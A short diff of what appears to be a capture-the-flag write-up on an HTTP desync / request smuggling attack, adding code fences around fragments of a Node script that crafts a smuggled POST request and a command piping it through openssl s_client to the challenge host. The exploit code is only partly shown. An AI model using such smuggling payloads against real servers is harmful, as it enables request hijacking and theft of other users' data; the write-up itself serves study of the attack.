@@ -3,6 +3,7 @@ This was an HTTP desync attack / request smuggling attack
 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
 https://nathandavison.com/blog/haproxy-http-request-smuggling
 
+```javascript
 p2 = `POST /files/ HTTP/1.1\r
 x-guid: 9d0eac94-33f6-47b5-85ed-dbed297cfa13\r
 content-type: text/plain\r
@@ -21,5 +22,6 @@ Content-Length: ${p2.length + 4}\r
 `
 t
 process.stdout.write(p1 + p2)
+```
 
 node script | openssl s_client -connect uploooadit.oooverflow.io:443 -quiet
